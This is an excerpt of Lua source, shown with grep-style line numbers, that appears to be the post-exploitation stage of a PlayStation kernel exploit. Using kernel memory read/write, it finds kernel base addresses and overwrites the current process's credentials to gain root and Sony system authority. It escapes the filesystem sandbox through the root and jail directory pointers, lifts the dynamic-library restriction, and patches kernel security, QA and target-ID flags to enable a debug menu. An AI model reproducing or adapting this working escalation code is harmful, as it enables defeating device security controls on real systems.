+2081-
+2082:        local kernel_pmap_store = kernel.addr.data_base + kernel_offset.DATA_BASE_KERNEL_PMAP_STORE
+2083-
+2084:        local pml4 = kernel.read_qword(kernel_pmap_store + OFFSET_PM_PML4)
+2085:        local cr3 = kernel.read_qword(kernel_pmap_store + OFFSET_PM_CR3)
+2086-        local dmap_base = pml4 - cr3
+2087-
+2088-        return dmap_base, cr3
+2089-    end
+2090-
+2091-    local function get_additional_kernel_address()
+2092-
+2093-        kernel.addr.allproc = find_allproc()
+2094:        kernel.addr.data_base = kernel.addr.allproc - kernel_offset.DATA_BASE_ALLPROC
+2095:        kernel.addr.base = kernel.addr.data_base - kernel_offset.DATA_BASE
+2096-
+2097-        local dmap_base, kernel_cr3 = get_dmap_base()
+2098-        kernel.addr.dmap_base = dmap_base
+2099-        kernel.addr.kernel_cr3 = kernel_cr3
+2100-    end
+2101-
+2102-    local function escape_filesystem_sandbox(proc)
+2103-
+2104:        local proc_fd = kernel.read_qword(proc + kernel_offset.PROC_FD) -- p_fd
+2105:        local rootvnode = kernel.read_qword(kernel.addr.data_base + kernel_offset.DATA_BASE_ROOTVNODE)
+2106-
+2107-        kernel.write_qword(proc_fd + 0x10, rootvnode) -- fd_rdir
+2108-        kernel.write_qword(proc_fd + 0x18, rootvnode) -- fd_jdir
+2109-    end
+2110-
+2111-    local function patch_dynlib_restriction(proc)
+2112-
+2113-        local dynlib_obj_addr = kernel.read_qword(proc + 0x3e8)
+2114-
+2115-        kernel.write_dword(dynlib_obj_addr + 0x118, 0) -- prot (todo: recheck)
+--
+2123-
+2124-    local function patch_ucred(ucred, authid)
+2125-
+2126-        kernel.write_dword(ucred + 0x04, 0) -- cr_uid
+2127-        kernel.write_dword(ucred + 0x08, 0) -- cr_ruid
+2128-        kernel.write_dword(ucred + 0x0C, 0) -- cr_svuid
+2129-        kernel.write_dword(ucred + 0x10, 1) -- cr_ngroups
+2130-        kernel.write_dword(ucred + 0x14, 0) -- cr_rgid
+2131-
+2132-        -- escalate sony privs
+2133:        kernel.write_qword(ucred + OFFSET_UCRED_CR_SCEAUTHID, authid) -- cr_sceAuthID
+2134-
+2135-        -- enable all app capabilities
+2136:        kernel.write_qword(ucred + OFFSET_UCRED_CR_SCECAPS, -1) -- cr_sceCaps[0]
+2137:        kernel.write_qword(ucred + OFFSET_UCRED_CR_SCECAPS + 8, -1) -- cr_sceCaps[1]
+2138-
+2139-        -- set app attributes
+2140:        kernel.write_byte(ucred + OFFSET_UCRED_CR_SCEATTRS, 0x80) -- SceAttrs
+2141-    end
+2142-
+2143-    local function escalate_curproc()
+2144-
+2145-        local proc = kernel.addr.curproc
+2146-
+2147:        local ucred = kernel.read_qword(proc + OFFSET_P_UCRED) -- p_ucred
+2148-        local authid = SYSTEM_AUTHID
+2149-
+2150-        local uid_before = syscall.getuid():tonumber()
+2151-        local in_sandbox_before = syscall.is_in_sandbox():tonumber()
+2152-
+2153-        printf("patching curproc %s (authid = %s)", hex(proc), hex(authid))
+2154-
+2155-        patch_ucred(ucred, authid)
+2156-        patch_dynlib_restriction(proc)
+2157-        escape_filesystem_sandbox(proc)
+2158-
+2159-        local uid_after = syscall.getuid():tonumber()
+2160-        local in_sandbox_after = syscall.is_in_sandbox():tonumber()
+2161-
+2162-        printf("we root now? uid: before %d after %d", uid_before, uid_after)
+2163-        printf("we escaped now? in sandbox: before %d after %d", in_sandbox_before, in_sandbox_after)
+2164-    end
+2165-
+2166-    local function apply_patches_to_kernel_data(accessor)
+2167-
+2168:        local security_flags_addr = kernel.addr.data_base + kernel_offset.DATA_BASE_SECURITY_FLAGS
+2169:        local target_id_flags_addr = kernel.addr.data_base + kernel_offset.DATA_BASE_TARGET_ID
+2170:        local qa_flags_addr = kernel.addr.data_base + kernel_offset.DATA_BASE_QA_FLAGS
+2171:        local utoken_flags_addr = kernel.addr.data_base + kernel_offset.DATA_BASE_UTOKEN_FLAGS
+2172-
+2173-        -- Set security flags
+2174-        print("setting security flags")
+2175-        local security_flags = accessor.read_dword(security_flags_addr)
+2176-        accessor.write_dword(security_flags_addr, bit64.bor(security_flags, 0x14))
+2177-
+2178-        -- Set targetid to DEX
+2179-        print("setting targetid")
+2180-        accessor.write_byte(target_id_flags_addr, 0x82)
+2181-
+--
+2188-        accessor.write_byte(utoken_flags_addr, bit64.bor(utoken_flags, 0x1))
+2189-
+2190-        print("debug menu enabled")
+2191-    end
+2192-
+2193-    get_additional_kernel_address()
+2194-
+2195-    -- patch current process creds
+2196-    escalate_curproc()
+2197-
+2198:    update_kernel_offsets()
+2199-
+2200-    -- init GPU DMA for kernel r/w on protected area
+2201-    gpu.setup()
+2202-
+2203-    local force_kdata_patch_with_gpu = false
+2204-
+2205-    if tonumber(FW_VERSION) >= 7 or force_kdata_patch_with_gpu then
+2206-        print("applying patches to kernel data (with GPU DMA method)")
+2207-        apply_patches_to_kernel_data(gpu)
+2208-    else
